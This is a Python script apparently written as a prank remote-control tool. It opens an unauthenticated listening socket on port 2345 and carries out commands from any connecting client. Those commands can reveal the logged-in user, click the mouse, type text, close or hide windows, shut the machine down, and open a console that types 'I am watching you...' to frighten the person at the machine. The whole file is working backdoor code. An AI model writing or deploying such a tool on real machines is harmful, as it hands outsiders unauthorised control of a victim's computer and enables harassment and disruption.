import socket
import subprocess
import mouse
import os
import keyboard
import time

def me():
    returned_output = str(subprocess.check_output("whoami"))[2:-1]
    conn.send(returned_output.encode("utf-8"))
def clickLeft():
    mouse.click("left")
    conn.send("Successfully clicked left button".encode("utf-8"))
def clickRight():
    mouse.click("right")
    conn.send("Successfully clicked right button".encode("utf-8"))
def shutdown():
    conn.send("Trying to shutdown server...".encode("utf-8"))
    os.system("shutdown -p")
def typing(text):
    time.sleep(0.2)
    keyboard.write(text)
    conn.send("Successfully typed your text".encode("utf-8"))
def switchWindow():
    keyboard.press("alt")
    keyboard.press("tab")
    keyboard.release("alt")
    keyboard.release("tab")
    conn.send("Successfully switched window".encode("utf-8"))
def closeWindow():
    keyboard.press("alt")
    keyboard.press("f4")
    keyboard.release("alt")
    keyboard.release("f4")
    conn.send("Successfully closed window".encode("utf-8"))
def hideWindows():
    keyboard.press("win")
    keyboard.press("d")
    keyboard.release("win")
    keyboard.release("d")
    conn.send("Successfully hid all windows".encode("utf-8"))
def changeLanguage():
    keyboard.press("shift")
    keyboard.press("alt")
    keyboard.release("shift")
    keyboard.release("alt")
    conn.send("Successfully changed language".encode("utf-8"))
def Mystify():
    conn.send("Starting Mystify".encode("utf-8"))
    os.system("Mystify.scr -a")
    conn.send("Successfully Mystified".encode("utf-8"))
def watchingYou():
    os.system("start cmd")
    time.sleep(0.1)
    keyboard.write("I am watching you...")
    time.sleep(3.0)
    keyboard.press("alt")
    keyboard.press("f4")
    keyboard.release("alt")
    keyboard.release("f4")
    conn.send("Successfully typed 'I am watching you...'".encode("utf-8"))

sock = socket.socket()
sock.bind(("", 2345))

while True:
    sock.listen(1)
    conn, address = sock.accept()

    while True:
        try:
            data = str(conn.recv(1024))[2:-1]
        except ConnectionResetError:
            break
        if not data:
            break
        if data == "me?" or data == "whoami" or data == "me":
            me()
        elif data == "clickLeft" or data == "clkL":
            clickLeft()
        elif data == "clickRight" or data == "clkR":
            clickRight()
        elif data == "shutdown" or data == "sd" or data == "shd":
            shutdown()
        elif data == "switch" or data == "alttab" or data == "altab":
            switchWindow()
        elif data == "close" or data == "closeWindow" or data == "clWin":
            closeWindow()
        elif data == "lang" or data == "switchLang":
            changeLanguage()
        elif data == "Mystify" or data == "mystify" or data == "myst":
            Mystify()
        elif data == "hide" or data == "hideWindows" or data == "hidW":
            hideWindows()
        elif data == "iamwatchingyou" or data == "watching" or data == "cmdScreammer":
            watchingYou()
        elif "type" in data:
            spisok = data.split("=")
            try:
                typing(spisok[1])
            except IndexError:
                conn.send("Error 2: Invalid syntax".encode("utf-8"))
            except Exception:
                conn.send("Unknown error".encode("utf-8"))
        else:
            conn.send("Error 1: Unknown command".encode("utf-8"))

sock.close()